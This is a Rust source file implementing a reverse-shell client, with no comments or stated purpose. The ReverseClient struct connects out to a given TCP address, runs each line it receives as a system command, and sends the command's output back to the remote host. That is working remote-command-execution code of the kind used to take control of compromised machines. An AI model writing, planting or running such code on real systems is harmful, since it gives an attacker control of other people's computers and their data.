use std::io::{BufRead, BufReader, Write};
use std::net::{TcpStream};
use std::process::Command;
use std::thread;
use std::thread::JoinHandle;
pub(crate) struct ReverseClient {
    stream: TcpStream,
}

impl ReverseClient {
    pub fn new(target: &str) -> Self {
        let stream = TcpStream::connect(target).expect("Failed to connect to target");
        ReverseClient{
            stream
        }
    }

    pub fn init_shell(self) -> JoinHandle<()> {
        thread::spawn(move || {
            let mut writer = self.stream;
            let reader_stream = writer.try_clone().unwrap();
            let mut reader = BufReader::new(reader_stream);

            loop {
                let mut line = String::new();

                match reader.read_line(&mut line) {
                    Ok(0) => {
                        println!("Server closed connection.");
                        break;
                    }
                    Ok(_) => {
                        let command = line.trim();
                        if command.is_empty() { continue; }

                        let mut parts = command.split_whitespace();
                        let cmd = parts.next().unwrap();
                        let args: Vec<&str> = parts.collect();

                        let process = Command::new(cmd)
                            .args(args)
                            .output();

                        match process {
                            Ok(output) => {
                                writer.write_all(&output.stdout[..]).unwrap();
                                writer.write_all(&output.stderr[..]).unwrap();
                                writer.write_all(b"\nEOF\n").unwrap();
                            }
                            Err(e) => {
                                let err_msg = format!("Failed to execute: {}\n", e);
                                writer.write_all(err_msg.as_bytes()).unwrap();
                            }
                        }
                        writer.flush().unwrap();
                    }
                    Err(_) => break,
                }
            }
        })
    }
}